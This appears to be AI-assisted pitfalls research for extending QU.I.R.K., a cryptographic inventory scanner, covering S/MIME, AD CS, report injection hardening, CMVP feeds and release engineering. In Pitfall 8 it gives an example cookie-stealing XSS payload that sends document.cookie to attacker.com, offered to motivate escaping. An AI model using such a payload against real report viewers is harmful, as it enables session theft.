# Pitfalls Research

**Domain:** Adding S/MIME content scanning, Windows AD CS connector, HTML/PDF injection hardening,
CMVP attestation feed, release engineering, chaos-lab fidelity fixes, and public-launch polish
to QU.I.R.K. — a mature Python+React cryptographic inventory scanner (v4.9 base).
**Researched:** 2026-05-16
**Confidence:** HIGH (grounded in QUIRK codebase patterns and confirmed historical decisions);
MEDIUM (AD CS impacket auth flow, CMVP feed schema — limited by available official docs).

---

## Critical Pitfalls

### Pitfall 1: S/MIME Content vs. Envelope Confusion

**What goes wrong:**
The email scanner (Phase 32) already probes IMAP transport TLS on port 993. When S/MIME content
scanning is added, developers conflate two entirely different layers: the IMAP TLS *transport*
posture (already measured) and the S/MIME *message-layer* crypto (signing algorithm, key size,
certificate chain inside the CMS blob). A single IMAPS connection produces two distinct
CryptoEndpoint records — one for the transport cipher suite and one for the S/MIME signing cert —
but they share the same host:port tuple. If the new scanner reuses the existing
`CryptoEndpoint(host, port, protocol="IMAPS")` record for S/MIME results, the two layers
collide: the existing transport TLS finding (which already ran through `_build_finding`) gets
overwritten or duplicated with the S/MIME signing-cert finding. CBOM Pass 1 then emits a
duplicate algorithm component for the same endpoint, and the CycloneDX schema validation gate
(Phase 42, `test_cbom_writer_validation.py`) fails on duplicate component refs.

**Why it happens:**
IMAP host:port is the only natural grouping key visible to the scanner. Without a distinct
`service_detail` prefix convention, the two layers look identical to the CBOM builder.

**How to avoid:**
Use the existing `service_detail` prefix convention. IMAP transport entries already carry
`"IMAP-STARTTLS"` or `"IMAPS"` as `service_detail`. S/MIME findings must use a distinct
prefix — e.g., `"SMIME-SIGN"` or `"SMIME-ENV"` — so the CBOM builder treats them as separate
components. Extend the existing `MOTION_PLAINTEXT_PROTOCOLS` / `DAR_SKIP_PROTOCOLS`
frozenset pattern to add an `SMIME_SKIP_PROTOCOLS` constant for Pass-2/3 if S/MIME-only
endpoints should not generate hollow certificate entries. Add a dedicated `smime_scan_json`
ORM column (additive, same pattern as `kerberos_scan_json`, `saml_scan_json`).

**Warning signs:**
- `test_cbom_writer_validation.py` fails with duplicate `bom-ref` errors after adding S/MIME
- The CBOM viewer in the dashboard shows two overlapping nodes for the same host:port
- `service_detail` of an S/MIME endpoint is empty or identical to the transport entry

**Phase to address:**
S/MIME scanner phase — define the `service_detail` convention and the ORM column before writing
any CBOM integration. The CBOM schema validation test must pass before the phase is marked done.

---

### Pitfall 2: S/MIME ASN.1 Indefinite-Length Attributes from Real Mail Clients

**What goes wrong:**
Thunderbird, Outlook, and Exchange all generate CMS SignedData with indefinite-length BER
encoding for certain authenticated attributes. Python's `cryptography` library parses DER
strictly; passing a BER-encoded CMS blob to `cryptography.hazmat.primitives.serialization`
or `asn1crypto.cms.ContentInfo.load()` raises `ValueError: tag mismatch` or silently
produces a truncated parse — QUIRK then logs the endpoint as `cert_pubkey_alg: Unknown`
with no finding emitted, which is a silent miss, not a graceful degradation.

**Why it happens:**
The `cryptography` library prioritizes strict DER compliance. Real mail clients produce
BER (which is a superset of DER but not identical). The difference is invisible unless
the scanner is tested against genuine production mailbox samples, not hand-crafted test
fixtures.

**How to avoid:**
Use `asn1crypto.cms.ContentInfo.load()` (from `asn1crypto`, already a transitive dep via
`cryptography`) rather than the `cryptography` library's CMS APIs for the initial parsing
step. `asn1crypto` handles indefinite-length BER. Extract the signing certificate and
algorithm OID from the `asn1crypto` parse tree, then use the `cryptography` library's
`x509.Certificate.from_der()` on the extracted cert DER bytes for key-size and algorithm
classification — which is always strict DER. Gate the entire CMS parse in a `try/except`
that logs a `scan_error_category='smime_parse_error'` structured error (matching the
`_wrapped_phase` pattern from Phase 41) so failures are visible in the scan error count
rather than silently discarded.

**Warning signs:**
- S/MIME chaos lab profile tests pass but live client mailboxes produce no findings
- `cert_pubkey_alg` is `"Unknown"` for endpoints that the manual OpenSSL CMS dump shows clearly
- No `scan_error_category` entries for any S/MIME parsing attempt (means errors are silently swallowed)

**Phase to address:**
S/MIME scanner phase — the chaos lab profile must include at least one BER-encoded S/MIME
fixture (can be generated with `openssl smime -sign` with `-nocerts` and then re-encoded with
a custom BER writer, or sourced from a Thunderbird export). The integration test must cover
the BER path explicitly.

---

### Pitfall 3: S/MIME IMAP Authentication Exposes Mailbox Content to the Scanner Process

**What goes wrong:**
S/MIME content scanning requires IMAP LOGIN (or AUTHENTICATE PLAIN/XOAUTH2) to fetch message
bodies. This means QUIRK authenticates into a real mailbox and reads email content. In a
consulting engagement, this is a significant privacy and legal exposure: subject lines, sender
names, and message snippets may appear in scan logs, SQLite `smime_scan_json`, HTML reports,
and PDF exports delivered to the client. A consultant who accidentally includes an executive's
email subjects in a deliverable faces serious liability.

**Why it happens:**
Scanner developers focus on crypto classification and overlook that the path to S/MIME cert
extraction necessarily traverses human-readable message metadata. The IMAP `FETCH` command
returns envelope data (From, To, Subject, Date) alongside the body structure.

**How to avoid:**
S/MIME scanning must operate in certificate-only mode: fetch only the message body structure
(`FETCH <uid> BODY[1]`) for `application/pkcs7-signature` MIME parts — never the text body.
Never store or log `From`, `To`, `Subject`, or any envelope header in `smime_scan_json`,
findings, or reports. The `service_detail` and `description` fields must contain only
cryptographic properties (algorithm OID, key size, cert serial, issuer CN). Add a QUIRK
`safe_str()`-equivalent scrubbing guard specifically for S/MIME metadata, and add it to the
existing AST-based credential-leakage CI gate (Phase 59, `test_credential_leakage.py`) with
a list of forbidden field names (`subject`, `from_addr`, `to_addr`, `body`). Document the
constraint in `docs/connectors/smime.md` so consultants understand what the scanner does and
does not collect.

**Warning signs:**
- `smime_scan_json` contains a `subject` or `from` key in any record
- S/MIME findings include sender or recipient information in `description` or `service_detail`
- The HTML report or PDF export shows any email subject line

**Phase to address:**
S/MIME scanner phase — the privacy constraint must be in the PLAN before implementation.
A negative test (`test_smime_no_envelope_leak.py`) must assert that `smime_scan_json`
records never contain forbidden keys. This test gates the phase.

---

### Pitfall 4: impacket pyOpenSSL Transitive Conflict Regressing the Core TLS Scanner

**What goes wrong:**
This has already burned QUIRK once (Key Decisions table: "`[all]` meta-extra excludes
`[identity]` — impacket pyOpenSSL transitive conflict downgrades `cryptography`, breaking
TLS scanner"). The Windows AD CS connector will introduce a deeper impacket dependency
than the existing unauthenticated Kerberos AS-REQ probe (Phase 20) — full TGT acquisition
via `impacket.krb5.kerberosv5.getKerberosTGT()` requires NTLM/Kerberos auth flows that
pull in more of impacket's dependency tree, potentially a newer pyOpenSSL pin. If the
AD CS connector is placed in `[identity]` alongside the existing Kerberos scanner, a
`pip install quirk[identity]` may now silently downgrade `cryptography` to a version that
breaks `sslyze` in the same venv.

**Why it happens:**
impacket's `setup.py` pins `pyOpenSSL>=22.0.0` and that package in turn constrains
`cryptography` to a version range that conflicts with `cryptography>=44.0` (required by
QUIRK core). pip's resolver picks the highest version satisfying both, but when impacket
upgrades its own pyOpenSSL floor, the conflict window shifts unpredictably.

**How to avoid:**
Create a separate `[adcs]` extras group rather than placing the AD CS connector in `[identity]`.
This isolates the impacket dep graph. Run a matrix pip-install test in CI:
`pip install quirk[all]`, `pip install quirk[identity]`, `pip install quirk[adcs]`,
`pip install quirk[identity,adcs]` — each followed by `python -c "import sslyze; import cryptography; print(cryptography.__version__)"` — and assert the `cryptography` version is `>=44.0`
in every combination. Add this as a CI job that runs on every PR touching `pyproject.toml`.
Document the constraint in `operators-guide.md`.

**Warning signs:**
- `pip install quirk[adcs]` produces a `ContextualVersionConflict` for `cryptography`
- `cryptography.__version__` is below `44.0` after installing with any extras combination
- `sslyze` raises an `ImportError` or SSL handshake failure after adding `[adcs]`

**Phase to address:**
Windows AD CS connector phase — the CI matrix test must be established before any code is
written, so conflict is caught immediately on first `pyproject.toml` edit.

---

### Pitfall 5: AD CS ESC1–ESC8 False Positives from LDAP-only Evidence

**What goes wrong:**
ESC1 (over-permissive certificate template — any user can enroll for any purpose) requires
reading `msPKI-Certificate-Name-Flag` and `msPKI-Enrollment-Flag` from the LDAP
`pKICertificateTemplate` object. ESC8 (NTLM relay against the HTTP enrollment endpoint)
requires probing the web enrollment URL. Tools like Certipy implement these checks via both
LDAP and RPC/DCOM. A scanner that reads only LDAP will see the template flags but will
miss the RPC-side `IF_ENFORCEENCRYPTICERTREQUEST` flag that determines whether ESC11
(RPC relay) is actually exploitable. If QUIRK flags ESC1 based on LDAP template flags
alone without verifying that the enrolling user's group membership actually allows
enrollment, the finding is a false positive for the majority of templates (which restrict
enrollment to specific groups via ACLs stored in the `nTSecurityDescriptor` — a binary
blob requiring SDDL parsing, not a simple LDAP string attribute).

**Why it happens:**
LDAP is easy to query; ACL parsing is hard. The `nTSecurityDescriptor` attribute is a binary
blob. Developers flag templates as "ESC1" when they see `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT`
set without also verifying the ACL allows low-privileged enrollment.

**How to avoid:**
Scope the AD CS connector to informational enumeration only: list CA names, issued template
names, and basic certificate properties (key algorithm, key size, validity period, EKU).
Do not emit ESC-numbered findings in v4.10. Instead, emit `ADCS-01: Weak template key size`
or `ADCS-02: Certificate template uses SHA-1 signature algorithm` — findings grounded in
the certificate's own crypto properties, not in the exploitation chain. If ESC-category
findings are introduced in a later milestone, gate them behind an explicit `--adcs-deep`
flag that requires elevated LDAP read rights and documents the risk of false positives in
the finding description. Add this scope decision to the Key Decisions table in PROJECT.md
immediately.

**Warning signs:**
- The finding description uses the word "exploitable" without also specifying the required
  privilege level and confirming the enrollment ACL was actually checked
- The finding category is named after an ESC number (ESC1, ESC3...) rather than the
  observable crypto property
- No `--adcs-deep` flag guards the LDAP ACL parsing path

**Phase to address:**
Windows AD CS connector phase — the PLAN must state the scope boundary (crypto-property
findings only, no ESC exploitation chains) and the planner must enforce it in the success
criteria.

---

### Pitfall 6: AD CS Kerberos Auth Requires Elevated Privilege That Consultants Rarely Have

**What goes wrong:**
Querying `CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=com` for AD CS
template objects via LDAP requires at minimum `Domain Users` read access to the Configuration
partition. In most environments that is granted, but the NTLM/Kerberos credential flow still
requires a domain-joined account or a supplied `username:password` pair. Consultants
conducting a black-box or partial-access assessment often have no domain credentials at all,
or have a read-only service account with restricted delegation. If QUIRK raises an unhandled
`ldap3.core.exceptions.LDAPBindError` or an impacket `KerberosError: KDC_ERR_PREAUTH_FAILED`
and surfaces it as a scan crash (rather than a structured `ADCS-UNREACH` finding), the
consultant loses the rest of the scan output.

**Why it happens:**
The existing Kerberos scanner (Phase 20) uses an **unauthenticated** AS-REQ probe that
never requires credentials. The AD CS connector needs authenticated LDAP — a fundamentally
different auth model. Developers porting the Kerberos scanner pattern to AD CS accidentally
assume the same credential-free path works.

**How to avoid:**
The AD CS connector must be credential-optional. If no `[adcs]` credentials are supplied
in `config.yaml`, the connector attempts an anonymous LDAP bind (which sometimes works for
the Configuration partition) and if that fails, emits a `coverage_gap` finding:
`ADCS-UNREACH: AD CS LDAP bind failed — supply [adcs] credentials in config.yaml`.
This matches the existing `coverage_gap` pattern from Phase 45. The `_wrapped_phase`
helper (Phase 41) must wrap the entire AD CS scan so an auth failure never crashes
`run_scan.py`. Add `adcs_scan_json` as a nullable ORM column.

**Warning signs:**
- `run_scan.py` raises an uncaught exception during the AD CS phase when credentials are absent
- The scan error log contains `LDAPBindError` or `KerberosError` rather than a structured finding
- No `coverage_gap` finding is emitted when AD CS is unreachable

**Phase to address:**
Windows AD CS connector phase — the credential-optional graceful degradation must be
implemented in Plan 01. The CI test for this path must mock the LDAP bind failure and
assert that `coverage_gap` is emitted and the scan completes normally.

---

### Pitfall 7: Windows Containers Are Impractical in the macOS Chaos Lab

**What goes wrong:**
The chaos lab runs on Docker Desktop for Mac (or Colima). Windows container images
(e.g., `mcr.microsoft.com/windows/servercore`) require Hyper-V isolation and a Windows
kernel — they do not run on macOS Docker. If the AD CS chaos lab profile uses a Windows
AD CS container (as would be natural for a realistic test), the entire `broker`-style
profile approach used for every other QUIRK lab service breaks on developer machines.

**Why it happens:**
AD CS only exists on Windows Server. The natural instinct is to find a containerized
ADCS image. There is no official Microsoft AD CS Docker image for Linux. Third-party
attempts exist but are unmaintained.

**How to avoid:**
The AD CS chaos lab profile must be Linux-native. Options in priority order: (1) A
Samba4 AD DC (`ghcr.io/docksal/dc-samba4` or similar) with the CA role provisioned
via `samba-tool` — this provides an LDAP endpoint exposing the Configuration partition
with fake PKI Services entries. (2) A mock LDAP server (e.g., `osixia/openldap`) with
pre-baked LDIF entries under `CN=Public Key Services,CN=Services,CN=Configuration`.
Option 2 is simpler and more deterministic for scanner testing — it does not require
Kerberos auth and directly exercises the LDAP query path. The chaos lab oracle
(`expected_results_v4.md`) must document which ESC/crypto properties the mock LDAP
exposes and what findings the scanner should emit. Apply the macOS bind-mount lessons
from Phase 999.84: use named volumes for any data directory, and set `LDAP_*` env vars
instead of bind-mounting cookie/cert files.

**Warning signs:**
- The AD CS chaos lab profile pulls a `mcr.microsoft.com/windows/*` image
- `./lab.sh all` fails on macOS with `no matching manifest for linux/amd64` or similar
- The profile is missing from `./lab.sh status` output

**Phase to address:**
Windows AD CS connector phase — the chaos lab profile must be designed as a Linux-native
mock from the start. Do not attempt a Windows container path and retrofit later.

---

### Pitfall 8: HTML/PDF Injection via Jinja2 `| safe` Filter on Adversary-Controlled Strings

**What goes wrong:**
`html_renderer.py` correctly enables Jinja2 `autoescape=select_autoescape(["html", "j2"])`.
However, autoescape is bypassed whenever a template renders a value through `| safe` or when
Python code wraps a value in `jinja2.Markup()` before passing it to the template context.
Findings already use `_build_finding` (Phase 48) and `md_cell()` (Phase 61 / REPORT-SAN-01)
for Markdown table cells, but the HTML template has a separate rendering path. If any finding
field — particularly `description`, `remediation`, `service_detail`, or the cert CN/SAN that
comes directly from scanner output — is marked `| safe` anywhere in `report.html.j2` or its
parent Jinja2 inheritance chain, a target server with a crafted TLS certificate CN like
`<script>fetch('https://attacker.com?d='+document.cookie)</script>` will execute arbitrary
JavaScript when the report is opened in a browser. Playwright then captures that script
execution in the PDF, which — depending on the script — can exfiltrate the auth token from
the dashboard or make outbound requests.

**Why it happens:**
Developers add `| safe` to fields that "should be safe" (e.g., severity badges, score bands
already computed internally) but forget that scanner output fields — cert CN, SAN, issuer,
cipher name — flow through the same template variables and are adversary-controlled. The
v4.8 Playwright SSRF clamp (Phase 58 / D-11) blocks outbound navigations but does not block
inline script execution from injected `<script>` tags within the rendered page.

**How to avoid:**
Audit every `| safe` occurrence in `quirk/reports/templates/report.html.j2` and every
Jinja2 `Markup()` call in Python report code. Any field that originates from scanner output
(cert attributes, endpoint strings, algorithm names) must never be `| safe`. Only static
strings computed entirely within QUIRK's own Python code (e.g., `_score_band()` output)
may be marked safe. Add a CI grep gate (matching the Phase 59 AST pattern) that fails if
`| safe` appears on any line that also contains a scanner-output variable name. The
equivalent of `md_cell()` for HTML output is Jinja2 autoescape — verify it is active by
adding a unit test that renders a template with a `<script>` tag in a finding field and
asserts the output contains `&lt;script&gt;`, not `<script>`.

**Warning signs:**
- `grep "| safe" quirk/reports/templates/*.j2` returns any result on a line containing
  `finding`, `cert`, `endpoint`, `description`, `remediation`, `san`, or `cn`
- `Markup(some_scanner_value)` appears anywhere in `html_renderer.py` or `executive.py`
- The existing `_md_escape.py` `md_cell()` function is used as the only sanitization without
  a matching HTML-layer guard

**Phase to address:**
HTML/PDF injection hardening phase (the v4.8 D-06 deferred item). This is the first phase
in v4.10 and should gate all other phases that add new scanner outputs to reports.

---

### Pitfall 9: Playwright PDF Metadata Fields Are Not Covered by Jinja2 Autoescape

**What goes wrong:**
Playwright's `page.pdf()` API sets PDF metadata (Title, Author, Creator, Producer) from
the HTML `<title>` tag and browser UA string by default. If QUIRK sets the HTML `<title>`
to something like `f"QU.I.R.K. Report — {cfg.target}"` and `cfg.target` contains a crafted
value (e.g., a target hostname that a malicious operator supplies), the PDF metadata Title
field carries the injection. Jinja2 autoescape does not apply to the `<title>` tag in the
same way it applies to body content — specifically, `select_autoescape(["html"])` does escape
`<title>` content, but if the value is pre-escaped in Python and passed as `Markup`, the
protection is bypassed. The PDF metadata fields are then visible to anyone who opens the
PDF's Properties dialog — a risk in consultant deliverables where the PDF is sent to clients.

**Why it happens:**
Developers set the `<title>` using a Python f-string before the Jinja2 autoescape layer can
act. The risk is subtle: the HTML renders correctly (because modern browsers auto-close
broken tags in `<title>`), but the raw string in the title attribute ends up in PDF metadata.

**How to avoid:**
Sanitize `cfg.target` and any other operator-supplied string before interpolating it into
the `<title>` tag or any PDF metadata field. The sanitization function should strip or
encode `<`, `>`, `"`, `&`, and `/` characters. Use the same function for the HTML report
filename (already partially addressed by the path-traversal guard in Phase 58). Consider
setting PDF metadata explicitly via Playwright's `page.pdf()` options (Playwright does not
expose direct metadata-override in its Python API as of v1.x — the only control is via
HTML `<meta>` tags with `name="author"` etc.) — set these meta tags to hardcoded values
(`QU.I.R.K.`) rather than user-supplied strings.

**Warning signs:**
- `f"QU.I.R.K. Report — {cfg.target}"` appears in the `<title>` tag without a sanitization call
- PDF exported from a scan against a target like `"><script>` shows broken metadata
- No unit test asserts the `<title>` output after sanitization

**Phase to address:**
HTML/PDF injection hardening phase. Pair with Pitfall 8 in the same phase plan.

---

### Pitfall 10: CMVP Feed Has No Schema Version — Silent Structural Changes Break the Parser

**What goes wrong:**
NIST's CMVP validated modules search (`csrc.nist.gov/projects/cryptographic-module-validation-program/validated-modules/search`)
provides JSON export but does not publish a schema version field. The feed structure has
changed in the past (field renames, nested object reshaping) without announcement. If QUIRK
builds a parser against the current feed structure and NIST reshapes the JSON (e.g., renames
`algorithmCertificates` to `algorithms`, or changes the nesting of `securityLevels`), the
parser silently returns empty results — no exception, no error, no finding. The CMVP
attestation feature then appears to work (no crash) but emits no `certified` annotations,
which is worse than a crash because the missing annotations are invisible in CI.

**Why it happens:**
The NIST feed is a screen-scraping export, not a stable API. There is no OpenAPI spec or
schema version. Developers parse the current shape and add no structural validation.

**How to avoid:**
Apply the same staleness pattern already in QUIRK for compliance mappings
(`quirk/compliance/__init__.py` with `last_verified` and `source_url`). Additionally, add a
structural assertion: after parsing the feed, assert that the top-level keys include the
expected fields (e.g., `assert "modules" in feed_data`). If the assertion fails, log a
`CMVP-STRUCT-ERR` structured error and fall back to the bundled offline snapshot rather
than silently returning empty. Bundle a pinned offline snapshot of the CMVP feed in the
QUIRK package (updated quarterly, same cadence as `model_meta.py`) so air-gapped
engagements and feed-structure-change failures both degrade gracefully to the snapshot.
The staleness CI gate must check that the bundled snapshot's `last_updated` date is within
90 days.

**Warning signs:**
- The CMVP parser returns 0 certified modules for a scan that probes AES-256-GCM endpoints
  (which should match multiple FIPS 140-3 validated modules)
- No `CMVP-STRUCT-ERR` finding or log entry appears when the feed JSON is deliberately
  malformed in the test fixture
- The offline snapshot is larger than 5MB (NIST feed is currently ~2MB) — indicates
  accidental duplication

**Phase to address:**
CMVP attestation feed phase. Design the offline-snapshot + structural-assertion pattern
before writing any algorithm-mapping logic.

---

### Pitfall 11: Algorithm String → CMVP Certificate Mapping Is Many-to-Many and Ambiguous

**What goes wrong:**
QUIRK's quantum-safety classifier uses strings like `"AES-256-GCM"`, `"ECDSA-P256"`,
`"RSA-2048"`. The CMVP feed records are indexed by module (hardware device or software
library), not by algorithm. A single module certificate may cover 20+ algorithms. Multiple
module certificates may cover the same algorithm. The "correct" CMVP cert for a given
endpoint's `"AES-256-GCM"` claim is ambiguous — it depends on which hardware/software
module the server is actually using, which QUIRK cannot observe without an agent. Mapping
`"AES-256-GCM"` to a CMVP certificate number and emitting `certified: true` in the CBOM
without knowing the actual module used is a false attestation — exactly the risk the Phase 52
D-01 deferral was designed to avoid.

**Why it happens:**
The CMVP feed makes it tempting to match algorithm names. The matching looks clean in a
proof-of-concept but conflates "this algorithm has been validated somewhere" with "this
endpoint is using a validated implementation."

**How to avoid:**
Never emit `certified: true` in the CBOM based on algorithm name matching alone. The CBOM
`certified` property must only be set when QUIRK has cryptographically verified the module
identity (e.g., via a vendor-specific API, attestation token, or explicit operator
configuration). What v4.10 CAN safely do: add a `fips_140_3_coverage` informational field
to the CBOM component's `properties` array that lists CMVP cert numbers for modules that
implement the detected algorithm — with a `type: "quirk:cmvp-coverage"` property tag and a
disclaimer in the finding `description` that presence on this list does not mean the
endpoint uses a FIPS-validated module. This is information, not attestation. Document this
distinction in the `docs/connectors/cmvp.md` guide.

**Warning signs:**
- `certified: true` appears in CBOM output for any endpoint scanned without explicit
  operator confirmation
- The CMVP mapping emits a single cert number for `"AES-256-GCM"` when there are
  hundreds of FIPS 140-3 certs covering AES-256
- No disclaimer appears in the finding description distinguishing coverage from certification

**Phase to address:**
CMVP attestation feed phase. The PLAN must include the explicit scope boundary: coverage
list only, no `certified: true` emission. The success criterion must include a negative
test asserting `certified` is never set by the CMVP module alone.

---

### Pitfall 12: Version String Drift Between pyproject.toml, `__init__.py`, CHANGELOG.md, and Git Tag

**What goes wrong:**
QUIRK already has `tests/test_version.py` that asserts `quirk.__version__ == "4.4.0"` and
`IntelligenceCfg().intelligence_version == "4.4.0"`. However, `pyproject.toml` shows
`version = "4.4.0"` while `quirk/__init__.py` says `__version__ = "4.4.0"` — already
diverged from the actual shipped version (v4.9). This means `test_version.py` is
currently pinned to a stale assertion and would fail if a developer runs the test suite
from scratch. For release engineering, the problem compounds: a release script that tags
`v4.10.0` on GitHub but forgets to update `pyproject.toml` or `CHANGELOG.md` produces a
wheel with the wrong version string embedded, which PyPI will reject on re-upload (PyPI
does not allow re-publishing the same filename with different content).

**Why it happens:**
Version strings live in three places (pyproject.toml, `__init__.py`, CHANGELOG.md header)
plus the git tag. Updating all four in one commit is easy to forget. The existing
`test_version.py` was pinned to a specific version and never updated as milestones shipped.

**How to avoid:**
Make `pyproject.toml` the single source of truth using `importlib.metadata`:
`__version__ = importlib.metadata.version("quirk")` in `quirk/__init__.py`. Remove the
hardcoded string. Update `test_version.py` to assert `quirk.__version__ == importlib.metadata.version("quirk")`
(identity check) rather than a specific version literal. The release script must update
`CHANGELOG.md` as a required step (not optional), verify that the new version appears in
`CHANGELOG.md`'s first `## X.Y.Z` heading, and only then create the git tag. Add a CI
check that reads `pyproject.toml` version and asserts `git describe --tags --abbrev=0`
matches on the main branch.

**Warning signs:**
- `python -c "import quirk; print(quirk.__version__)"` returns a version different from
  `git describe --tags --abbrev=0`
- `CHANGELOG.md` does not have a section for the most recent git tag
- `test_version.py` is pinned to a literal version string rather than a dynamic check

**Phase to address:**
Release engineering phase — fix the version source-of-truth before any release script is
written, so the script has a reliable version to tag.

---

### Pitfall 13: Sigstore Cosign Keyless Signing Only Works in GitHub Actions (Not Local Builds)

**What goes wrong:**
Cosign keyless signing requires an OIDC identity token. GitHub Actions provides this token
automatically via the `id-token: write` permission. A local `make release` invocation (or
any non-GHA CI) has no OIDC provider, so `cosign sign-blob --yes` fails with
`COSIGN_EXPERIMENTAL: no OIDC token available`. If the release script does not detect
this and falls back gracefully, it either crashes the release or silently produces an
unsigned artifact — both are bad. Additionally, the signing identity (the GHA workflow URL)
appears in the Rekor transparency log forever, including the repository name — this is
fine for open-source but exposes internal repository structure for private builds.

**Why it happens:**
Cosign documentation focuses on the happy path (GHA). Local failure modes are not
prominently documented. Developers test the signing locally with `--insecure-skip-verify`
and assume the GHA path works identically.

**How to avoid:**
The release workflow must be GHA-only — no local invocation path for signed releases.
`Makefile` targets for release must print a warning and exit 1 if `GITHUB_ACTIONS` env is
not set. For local development/testing, provide a `make dist` target that builds the wheel
and sdist without signing. The signed artifact is produced only by the GHA
`.github/workflows/release.yml` workflow, gated on a `v*` tag push. Add a `SECURITY.md`
that documents the signing identity (the GHA OIDC workflow URL) so consumers can verify.
If PGP signing is added as an alternative, the key custody policy must be documented in
`SECURITY.md` before any key is generated — key rotation and revocation procedures are the
hard part, not the signing itself.

**Warning signs:**
- The release script does not check for `GITHUB_ACTIONS` before attempting `cosign sign-blob`
- A successful local `make release` produces artifacts without a `.sig` or `.sigstore` file
  (means signing was silently skipped)
- No `SECURITY.md` exists yet before the first signed release is published

**Phase to address:**
Release engineering phase. `SECURITY.md` must be written first, before the release workflow.
It defines the signing policy, which the workflow implements.

---

### Pitfall 14: Accidental PyPI Publication of a "quirk" Package That Collides With an Existing Name

**What goes wrong:**
`pyproject.toml` has `name = "quirk"`. PyPI already has a package named `quirk`
(`pypi.org/project/quirk/`) — it is a different project. Publishing QUIRK's wheel to PyPI
under the name `quirk` will either be rejected (if the existing owner has claimed the name)
or, if the existing package is abandoned and the name is reclaimed, QUIRK's package will
overwrite the existing public package in the `pip install quirk` index. Both outcomes are
problematic for consultants who have the old `quirk` package installed.

**Why it happens:**
`pyproject.toml` was set to `name = "quirk"` during early development without a PyPI
namespace check. The release engineering phase is the first time anyone attempts an actual
`twine upload`.

**How to avoid:**
Before the first `twine upload --repository pypi`, run `pip index versions quirk` and check
`pypi.org/project/quirk/`. If the name is taken, rename the PyPI distribution name to
`quirk-scanner` or `quirk-qpqc` in `pyproject.toml` while keeping the importable package
name `quirk` (the `name` and the import name can differ). Update the Homebrew formula and
all install documentation to use the correct PyPI distribution name. Do a test upload to
`test.pypi.org` first to confirm the name is available and the wheel installs correctly
before publishing to production PyPI.

**Warning signs:**
- No `pip index versions quirk` check was run before the release workflow was written
- `twine check dist/*` passes but `twine upload --repository testpypi dist/*` returns
  HTTP 403 (name conflict)
- The Homebrew formula uses `pip install quirk` without pinning to the QUIRK project's PyPI URL

**Phase to address:**
Release engineering phase — name check is the first task, before any packaging work.

---

### Pitfall 15: Chaos Lab Oracle Drift — `expected_results_v4.md` Rows Not Updated When Profiles Change

**What goes wrong:**
The `expected_results_v4.md` oracle is the ground truth for what findings each chaos lab
profile should produce. Phase 42 added a docker-compose drift sentinel in CI that fails if
a profile appears in `docker-compose.yml` but not in the oracle. However, the inverse is
not checked: if a finding type changes (e.g., a severity changes from HIGH to MEDIUM, or a
finding category is renamed) but the oracle row is not updated, the CI sentinel does not
catch it — the chaos lab still "passes" because the profile is listed, but the oracle is
wrong. Consultants using the chaos lab to validate a scanner install will see a discrepancy
between what QUIRK reports and what `expected_results_v4.md` says to expect, destroying
confidence in the tool.

**Why it happens:**
The CI sentinel only checks profile name presence, not finding content. Updating `expected_results_v4.md`
is easy to forget when a scanner finding is changed in a non-chaos-lab phase.

**How to avoid:**
Add a second oracle check: a pytest fixture that loads `expected_results_v4.md`, parses the
expected findings per profile (finding category + severity), and compares against a
pre-recorded golden snapshot of actual scanner output against the chaos lab. This is a
golden-snapshot test (similar to `test_cbom_writer_validation.py`'s profile approach) —
not live against a running container, but against a stored fixture representing what the
scanner produces for a known chaos lab config. When a finding changes, the test fails and
forces an explicit oracle update. Additionally, enforce the CLAUDE.md chaos-lab rule in
the phase completion checklist: any scanner change that alters a finding category, severity,
or description must include an `expected_results_v4.md` diff in the same commit.

**Warning signs:**
- A scanner finding severity changes in a PR but `expected_results_v4.md` is not modified
- The chaos lab profile appears in the CI sentinel check but the oracle row has stale
  severity or finding counts
- `./lab.sh all` followed by a manual scan produces findings that contradict the oracle

**Phase to address:**
Chaos-lab fidelity phase (Phase 999.83/999.84 follow-on). The golden-snapshot test should
be added here as a structural fix, not left to per-phase discipline.

---

### Pitfall 16: macOS Docker Bind-Mount Semantics Cause Silent Data Loss on Named-Volume Migration

**What goes wrong:**
Phase 999.84 fixed three macOS bind-mount failures (ldaps chown, rabbitmq erlang cookie,
gitea-seed idempotency) by moving from bind mounts to named volumes or environment-variable
overrides. A silent risk remains: if an existing developer's machine has a lingering named
volume from before the fix (e.g., `chaoslab_rabbitmq_data` created by the old bind-mount
config), and the new `docker-compose.yml` declares a new named volume with a different
driver or options, `docker compose up` will reuse the stale volume without error — but the
stale volume may have wrong ownership or corrupted state from the previous bind-mount run.
The container starts but behaves incorrectly, and the developer has no indication that the
volume is stale.

**Why it happens:**
Docker does not warn when an existing named volume is reused after its definition changes.
The volume is "there" so Docker uses it. This is a well-known Docker Compose footgun that
burned the chaos lab team during Phase 999.83 (gitea seed idempotency).

**How to avoid:**
The chaos-lab fidelity phase must include a `./lab.sh reset` command (or `./lab.sh down --volumes`
equivalent) in the UAT verification steps for any profile that migrated from bind-mount to
named volume. Document in `README.md` that existing developers must run `./lab.sh down --volumes`
once after pulling the bind-mount-to-named-volume migration commit, before running
`./lab.sh all`. Add a version comment in `docker-compose.yml` above each named volume
declaration noting when it was introduced, so future maintainers know which volumes are new.

**Warning signs:**
- `docker volume ls` shows a volume that matches the old bind-mount path pattern
- `./lab.sh all` completes without error but `docker compose logs rabbitmq-broker` shows
  the erlang cookie error despite the env-var fix being applied
- The chaos lab UAT does not include a `./lab.sh down --volumes` step before `./lab.sh all`

**Phase to address:**
Chaos-lab fidelity phase (999.84 and any follow-on). Document the volume-migration UAT
pattern in README.md and lab.sh at the same time as the volume definition change.

---

## Technical Debt Patterns

| Shortcut | Immediate Benefit | Long-term Cost | When Acceptable |
|----------|-------------------|----------------|-----------------|
| Placing AD CS in `[identity]` extras | One fewer extras group | Worsens impacket conflict surface; may break `pip install quirk[identity]` for all existing identity users | Never — use `[adcs]` |
| Using CMVP algorithm name matching to emit `certified: true` | Looks like a complete feature | False attestation; destroys consultant credibility if challenged in an audit | Never |
| Hardcoding version string in `quirk/__init__.py` | Simple | Four version-string locations drift; `test_version.py` becomes stale | Never for new code; migrate to `importlib.metadata` in release engineering phase |
| `| safe` on description/remediation fields in Jinja2 templates | Rich HTML in report body | XSS via adversary-controlled cert CN or finding text | Never on scanner-output fields |
| Signing releases locally with PGP rather than GHA + sigstore | Works offline | Key custody complexity; rotation risk; no transparency log | Only if GHA is unavailable; requires documented key custody policy |
